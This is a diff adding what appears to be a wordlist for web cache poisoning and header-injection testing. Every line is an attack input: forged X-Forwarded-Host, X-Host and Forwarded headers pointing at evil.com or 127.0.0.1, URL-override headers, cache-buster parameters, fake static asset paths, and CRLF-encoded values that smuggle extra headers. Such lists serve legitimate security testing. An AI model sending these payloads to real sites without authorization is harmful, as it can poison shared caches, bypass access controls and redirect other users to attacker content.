@@ -1,0 +1,25 @@
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Original-URL: /evil
+X-Rewrite-URL: /evil
+X-Forwarded-For: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Forwarded-Proto: http
+X-Forwarded-Scheme: http
+X-Forwarded-Port: 80
+Forwarded: host=evil.com
+Forwarded: for=127.0.0.1
+
+?cb=evil
+?cachebust=evil
+?utm_source=evil
+?utm_campaign=evil
+
+/evil.css
+/evil.js
+/evil.png
+/evil.jpg
+/evil.json
+
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aX-Host:evil.com
